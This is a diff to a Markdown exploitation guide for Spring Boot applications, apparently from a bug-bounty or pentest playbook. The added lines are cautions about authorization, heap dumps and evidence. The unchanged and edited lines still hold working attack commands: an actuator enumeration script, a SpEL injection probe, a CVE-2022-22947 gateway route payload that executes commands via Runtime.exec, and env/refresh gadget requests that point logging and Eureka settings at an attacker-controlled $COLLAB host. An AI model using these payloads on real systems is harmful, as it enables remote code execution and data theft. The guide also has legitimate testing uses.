@@ -31,9 +31,13 @@ report_count: 16
 
 # HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities
 
+Endpoint availability, sanitization and CVE impact depend on exact versions/configuration; upstream report_count and severity labels are not verified evidence. A matching banner, JSON content type or arithmetic result alone does not prove Spring-specific exploitation. Use the [Spring4Shell advisory](https://spring.io/security/cve-2022-22965/) for required components and fixed versions.
+
+Heap dumps can expose extensive personal data and strain availability: omit heapdump from generic enumeration and obtain a separate bounded evidence plan before capture. Do not print secrets or use recovered credentials. Route/env writes, refresh, shutdown and webshell persistence require separate exact-action authorization and cleanup plans in a disposable test environment.
+
 ## Crown Jewel Targets
 
-Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets in memory.
+An unintentionally accessible heap dump can disclose sensitive live-memory data, but contents and impact must be established rather than assumed.
 
 **Highest-value findings:**
 - **`/actuator/heapdump`** — full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory
@@ -71,7 +75,7 @@ done
 BASE="https://$TARGET/actuator"
 
 # High-impact endpoints
-ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics" 
+ENDPOINTS=("env" "threaddump" "mappings" "beans" "metrics"
            "loggers" "info" "health" "configprops" "shutdown" "trace"
            "httptrace" "auditevents" "sessions" "scheduledtasks" "caches"
            "flyway" "liquibase" "refresh" "restart")
@@ -83,7 +87,7 @@ for EP in "${ENDPOINTS[@]}"; do
   BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP")
   CT=$(curl -s -o /dev/null -w "%{content_type}" -H "Accept: application/json" "$BASE/$EP")
   if echo "$CT" | grep -qi "json" && ! echo "$BODY" | grep -qi "Whitelabel Error Page\|<html"; then
-    echo "[+] EXPOSED: $BASE/$EP"
+    echo "[?] Candidate JSON endpoint: $BASE/$EP (validate status/schema and intended access)"
   fi
 done
 
@@ -162,7 +166,7 @@ curl -s "https://$TARGET/console" | grep -i "H2"
 curl -s -X POST "https://$TARGET/api/user/name" \
   -H "Content-Type: application/json" \
   -d '{"name": "#{7*7}"}'
-# If returns 49 → SpEL injection confirmed
+# A controlled evaluation result is an indicator; identify the actual expression engine and context.
 
 # RCE payload — note: exec() returns a Process, not a String, so a bare
 # exec("id") produces NO visible output. Confirm via an OOB curl callback
@@ -182,19 +186,19 @@ curl -s -X POST "https://$TARGET/functionRouter" \
 ## Phase 5b — Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)
 If the `gateway` actuator is exposed, add a route whose filter body is SpEL, then refresh to evaluate it (escape inner quotes for your shell):
 ```bash
-curl -s -X POST "$BASE/actuator/gateway/routes/hax" -H "Content-Type: application/json" \
+curl -s -X POST "$BASE/gateway/routes/hax" -H "Content-Type: application/json" \
  -d '{"id":"hax","filters":[{"name":"AddResponseHeader","args":{"name":"X","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{ \"id\" })}"}}],"uri":"http://x"}'
-curl -s -X POST "$BASE/actuator/gateway/refresh"; curl -s "$BASE/actuator/gateway/routes"
+curl -s -X POST "$BASE/gateway/refresh"; curl -s "$BASE/gateway/routes"
 ```
 
 ## Phase 5c — Writable `/env` -> `/refresh` gadget RCE
 When `/actuator/env` accepts POST and `/actuator/refresh` exists, poison a property then reload:
 ```bash
 # logback JNDI:
-curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"logging.config","value":"http://$COLLAB/logback.xml"}'
+curl -s -X POST "$BASE/env" -H "Content-Type: application/json" -d '{"name":"logging.config","value":"http://$COLLAB/logback.xml"}'
 # Eureka XStream deserialization:
-curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://$COLLAB/x"}'
-curl -s -X POST "$BASE/actuator/refresh"
+curl -s -X POST "$BASE/env" -H "Content-Type: application/json" -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://$COLLAB/x"}'
+curl -s -X POST "$BASE/refresh"
 ```
 (Veracode: Exploiting Spring Boot Actuators.)
 
